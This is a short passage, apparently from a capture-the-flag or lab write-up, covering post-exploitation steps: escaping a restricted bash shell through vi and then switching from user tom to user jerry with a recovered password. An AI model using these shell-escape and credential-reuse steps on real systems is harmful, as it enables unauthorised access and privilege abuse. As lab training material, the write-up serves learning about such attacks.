## Post-Exploitation

### Escaping rbash via vi

```bash
vi
:set shell=/bin/bash
:shell
export PATH=$PATH:/usr/bin:/bin
```

### Lateral Movement — tom → jerry

```bash
su jerry
# password: adipiscing
```

